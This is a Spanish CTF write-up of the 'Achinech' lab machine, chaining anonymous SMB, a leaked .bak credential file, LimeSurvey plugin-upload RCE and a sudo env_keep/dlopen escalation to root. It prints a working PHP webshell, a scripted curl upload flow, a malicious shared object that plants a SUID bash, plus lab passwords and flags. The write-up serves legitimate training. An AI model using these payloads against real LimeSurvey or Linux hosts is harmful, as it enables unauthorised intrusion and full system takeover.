---
tags: [ctf, thehackerslabs, linux, limesurvey, plugin-rce, sudo, dlopen, writeup]
plataforma: The Hackers Labs
os: Debian 12 (Bookworm)
dificultad: media
estado: Resuelto
fecha: 2026-10-24
---

# Achinech — Roadmap / Writeup

> [!success] Resultado
> - **USER flag** (`/home/acaimo/user.txt`): `THL{4c41m0_3l_m3nc3y_gu4nch3}`
> - **ROOT flag** (`/root/root.txt`): `THL{m3nc3y_supr3m0_d3l_t31d3}`

Nota principal: [[Achinech]]

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| IP objetivo | `192.168.56.108` |
| Kali (atacante) | `192.168.56.1` (vboxnet0, Host-Only) |
| Hostname | `ACHINECH` |
| SO | Debian 12 (Bookworm) |
| Servicios | 22 SSH · 80 LimeSurvey · 139/445 Samba · 3306 MariaDB |

---

## 1. Reconocimiento

```bash
nmap -sT -p- --min-rate 3000 -T4 -oN nmap/allports.txt 192.168.56.108
nmap -sT -sV -sC -p22,80,139,445,3306 -oN nmap/services.txt 192.168.56.108
```

```
22/tcp   OpenSSH 9.2p1 Debian
80/tcp   Apache 2.4.68 — http-title: LimeSurvey (http-generator: LimeSurvey)
139/445  Samba smbd 4  (NetBIOS name: ACHINECH)
3306/tcp MariaDB 10.3
```

**Interpretación:** web LimeSurvey + Samba con posible sesión nula. MariaDB expuesto pero sin creds todavía.

---

## 2. SMB anónimo → documentación interna

```bash
nxc smb 192.168.56.108 -u '' -p '' --shares
#   documentos   READ
#   IPC$         (Remark: "Achinech ERP - Recursos compartidos")

smbclient //192.168.56.108/documentos -N -c 'recurse ON; prompt OFF; mget *'
# -> acta_implantacion.pdf
```

El PDF (*ACTA DE IMPLANTACION* de **Guanche Sistemas S.L.**) revela:
- Usuario administrador del panel: **`Bencomo`**
- Panel en la raíz: `http://<servidor>/index.php/admin`
- La contraseña inicial quedó en un script de despliegue **olvidado en el webroot**:
  `despliegue_limesurvey.php.bak`

---

## 3. Fuga de credenciales (fichero .bak en el webroot)

```bash
curl -s http://192.168.56.108/despliegue_limesurvey.php.bak
```

```php
$db_user = "lsuser";
$db_pass = "Ls_4ch1n3ch_2025";
$admin_user = "Bencomo";
$admin_pass = "G3st10n_Ach1n3ch#25";
```

> [!note] El servidor sirve el `.bak` como texto plano (no lo interpreta PHP), así que `curl` basta.

---

## 4. LimeSurvey: login + RCE por subida de plugin

Versión detectada tras login: **LimeSurvey 6.1 (build 180)** (CE). Un admin autenticado puede subir un **plugin** (ZIP). Si el ZIP contiene un `.php`, se extrae bajo `upload/plugins/<nombre>/` — directorio **servido por Apache** → RCE.

### 4.1 Login (maneja el token CSRF)

```bash
J=cookies.txt
B=http://192.168.56.108
tok(){ grep -oE '<input[^>]*name="YII_CSRF_TOKEN"[^>]*>' "$1" | grep -oE 'value="[^"]*"' | head -1 | sed 's/value="//;s/"//'; }

curl -s -c $J "$B/index.php/admin/authentication/sa/login" > lf.html
C=$(tok lf.html)
curl -s -b $J -c $J "$B/index.php/admin/authentication/sa/login" \
  --data-urlencode "YII_CSRF_TOKEN=$C" --data-urlencode "authMethod=Authdb" \
  --data-urlencode "user=Bencomo" --data-urlencode "password=G3st10n_Ach1n3ch#25" \
  --data-urlencode "loginlang=default" --data-urlencode "login_submit=login" \
  -o /dev/null -w "login HTTP %{http_code}\n"   # -> 302 (OK)
```

### 4.2 Plugin malicioso

`config.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
 <metadata>
  <name>AchiShell</name><type>plugin</type>
  <creationDate>2025-01-01</creationDate><lastUpdate>2025-01-01</lastUpdate>
  <author>pentest</author><version>1.0.0</version>
  <license>GPL</license><description>rce</description>
 </metadata>
 <compatibility>
  <version>3.0</version><version>4.0</version><version>5.0</version><version>6.0</version>
 </compatibility>
 <updaters disabled="disabled"></updaters>
</config>
```

`sh.php`:
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"; } ?>
```

```bash
zip AchiShell.zip config.xml sh.php
```

### 4.3 Subir + confirmar instalación

```bash
# subir (mismo jar/cookie que el login)
C=$(tok pm2.html)   # token de /index.php/admin/pluginmanager/sa/index
curl -s -b $J -c $J "$B/index.php/admin/pluginmanager/sa/upload" \
  -F "YII_CSRF_TOKEN=$C" -F "the_file=@AchiShell.zip;type=application/zip"   # 302
# confirmar (extrae a disco, bajo upload/plugins/)
curl -s -b $J -c $J -L "$B/index.php/admin/pluginmanager/sa/uploadConfirm" > conf.html
C=$(tok conf.html)
curl -s -b $J -c $J -L "$B/index.php/admin/pluginmanager/sa/installUploadedPlugin" \
  --data-urlencode "YII_CSRF_TOKEN=$C" --data-urlencode "isUpdate=false"
```

> [!tip] La activación del plugin da "error" (el `.php` no es una clase `PluginBase` válida), **pero los ficheros ya quedan extraídos** bajo `upload/plugins/AchiShell/` tras el paso `uploadConfirm`.

### 4.4 Webshell → www-data

```bash
curl -s 'http://192.168.56.108/upload/plugins/AchiShell/sh.php?cmd=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Reuso de credenciales → user flag

La BD estaba a mano con las creds del `.bak`. Entre las tablas de LimeSurvey hay una **que no pertenece a la app**:

```bash
sh='http://192.168.56.108/upload/plugins/AchiShell/sh.php'
curl -s -G "$sh" --data-urlencode \
  'cmd=mysql -ulsuser -pLs_4ch1n3ch_2025 achinech -e "select * from credenciales_backup"'
```

```
id  servicio             usuario  clave             notas
1   Acceso SSH servidor  acaimo   Tinerfe_2025_ERP  Cuenta de mantenimiento del sistema...
```

```bash
ssh acaimo@192.168.56.108            # Tinerfe_2025_ERP
cat ~/user.txt                       # THL{4c41m0_3l_m3nc3y_gu4nch3}
```

---

## 6. Escalada a root: sudo + dlopen de una variable de entorno

```bash
sudo -l
```
```
env_keep+=ACHINECH_PLUGIN
(root) NOPASSWD: /opt/achinech/bin/registro
```

El binario `registro` usa `getenv("ACHINECH_PLUGIN")` como ruta para `dlopen`, y resuelve el símbolo `registrar_evento` con `dlsym`:

```bash
strings /opt/achinech/bin/registro | grep -iE 'getenv|dlopen|dlsym|ACHINECH_PLUGIN|registrar_evento'
# getenv  dlopen  dlsym  ACHINECH_PLUGIN  /opt/achinech/lib/libregistro.so  registrar_evento
```

Como `sudo` **preserva `ACHINECH_PLUGIN`** (`env_keep`), apuntamos a un `.so` propio que exporta `registrar_evento` y se ejecuta como root.

### 6.1 `.so` malicioso (compilado en Kali, Debian amd64)

```c
// evil.c
#include <stdlib.h>
#include <unistd.h>
static void pwn(void){
    setuid(0); setgid(0);
    system("id > /tmp/pwn.txt; cat /root/root.txt >> /tmp/pwn.txt; "
           "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash");
}
__attribute__((constructor)) void init(void){ pwn(); }
void registrar_evento(void){ pwn(); }
```

```bash
gcc -shared -fPIC -o evil.so evil.c
scp -O evil.so acaimo@192.168.56.108:/tmp/evil.so
```

### 6.2 Disparo

```bash
ACHINECH_PLUGIN=/tmp/evil.so sudo -n /opt/achinech/bin/registro
cat /tmp/pwn.txt
#   uid=0(root) gid=0(root) ...
#   THL{m3nc3y_supr3m0_d3l_t31d3}
/tmp/rootbash -p -c 'id; cat /root/root.txt'   # euid=0 -> shell root interactiva
```

---

## Qué funcionó
- `smbclient -N` → PDF que encadena todo el ataque.
- `.bak` legible en el webroot → creds del panel.
- RCE de LimeSurvey por subida de plugin (ficheros extraídos a `upload/plugins/`).
- Tabla `credenciales_backup` → reuso directo de la clave SSH.
- `env_keep` + `dlopen(getenv())` → `.so` propio ejecutado como root.

## Qué aprendí
- Un `dlopen` sobre una ruta controlada por una variable de entorno que `sudo` preserva es escalada trivial: exportar un `.so` con constructor / símbolo esperado.
- LimeSurvey: el flujo real de RCE es `upload` → `uploadConfirm` (ya extrae a disco) → acceder al `.php` en `upload/plugins/`, aunque la "instalación" del plugin falle.
- Encadenar fuentes: SMB (doc) → web (`.bak`) → BD (reuso) → sistema (sudo).

## Limpieza realizada
```bash
# en el objetivo
rm -f /tmp/rootbash /tmp/evil.so /tmp/pwn.txt
rm -rf /var/www/html/upload/plugins/AchiShell
```
